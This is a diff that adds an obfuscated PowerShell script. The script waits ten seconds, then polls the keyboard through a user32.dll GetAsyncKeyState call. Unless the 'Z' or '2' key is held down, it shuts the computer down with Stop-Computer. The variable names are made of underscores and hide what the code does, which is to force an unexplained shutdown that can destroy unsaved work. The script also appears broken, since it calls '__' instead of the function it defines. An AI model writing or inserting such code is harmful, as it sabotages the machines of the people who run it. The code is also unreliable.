@@ -1,0 +1,9 @@
+$__=Start-Sleep -Seconds 10
+$___=function($__){Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class __{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vKey);}
+"@;return [__]::GetAsyncKeyState($__) -lt 0}
+$____=__ 0x5A
+$_____ = __ 0x32
+if (-not $____ -and -not $_____) {Stop-Computer}
